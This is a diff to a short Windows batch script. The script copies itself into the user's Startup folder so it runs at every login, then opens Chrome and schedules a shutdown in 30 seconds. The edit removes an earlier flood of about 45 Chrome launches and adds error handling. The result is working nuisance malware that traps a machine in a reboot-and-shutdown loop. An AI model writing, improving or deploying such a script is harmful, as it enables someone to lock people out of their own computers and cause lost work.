@@ -10,52 +10,19 @@ set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 rem Move the batch file to the startup folder
 move "%batch_path%%~nx0" "%startup_folder%"
 
+if errorlevel 1 (
+    echo Failed to move batch file to startup folder.
+    exit /b
+)
+
 echo Batch file moved to startup folder.
 
-shutdown -s -t 30
+start Chrome
+if errorlevel 1 (
+    echo Failed to start Chrome.
+)
 
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
-start Chrome
+shutdown -s -t 30
+if errorlevel 1 (
+    echo Failed to initiate shutdown.
+)
